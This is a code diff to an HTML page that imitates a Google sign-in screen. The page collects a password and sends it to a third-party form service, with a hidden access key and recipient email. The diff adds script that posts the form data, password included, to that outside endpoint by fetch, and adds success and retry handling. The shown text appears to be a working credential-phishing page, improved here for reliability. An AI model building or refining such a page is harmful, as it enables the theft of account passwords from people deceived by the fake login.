@@ -139,6 +139,14 @@
             clear: both;
             display: table;
         }
+        
+        /* Error message styling */
+        .error-msg {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
 </head>
 
@@ -156,6 +164,9 @@
             
             <!-- Your Access Key -->
             <input type="hidden" name="access_key" value="cec54607-e019-4df5-b362-9aa6a9529923">
+            
+            <!-- Specify recipient email -->
+            <input type="hidden" name="to" value="your-email@example.com">
             
             <!-- Optional: Redirect after submission -->
             <!-- <input type="hidden" name="redirect" value="https://yourdomain.com/thank-you"> -->
@@ -177,11 +188,13 @@
                 <label for="password" style="display:none;">Password</label>
                 <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                 
-                <button type="submit" class="next-btn">Next</button>
+                <button type="submit" class="next-btn" id="submitBtn">Next</button>
                 
                 <div class="clearfix"></div>
                 
                 <a href="#" class="forgot-link">Forgot password?</a>
+                
+                <div id="errorMessage" class="error-msg"></div>
             </div>
 
         </form>
@@ -205,11 +218,45 @@
         // Add loading state on final submit
         const form = document.getElementById('googleForm');
         const btn = document.querySelector('#step-password .next-btn');
+        const errorMsg = document.getElementById('errorMessage');
 
-        form.addEventListener('submit', () => {
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault(); // Prevent default form submission
+            
             btn.textContent = "Signing in...";
             btn.style.backgroundColor = "#9aa0a6";
             btn.disabled = true;
+            errorMsg.style.display = 'none';
+
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form),
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Success! Show a success message or redirect
+                    btn.textContent = "Success!";
+                    setTimeout(() => {
+                        alert("Form submitted successfully!");
+                        // Optionally redirect: window.location.href = data.redirect || window.location.href;
+                    }, 500);
+                } else {
+                    // Error
+                    throw new Error(data.message || "Submission failed");
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorMsg.textContent = "Could not submit form: " + error.message;
+                errorMsg.style.display = 'block';
+                btn.textContent = "Retry";
+                btn.style.backgroundColor = "#d93025";
+            }
         });
     </script>
 
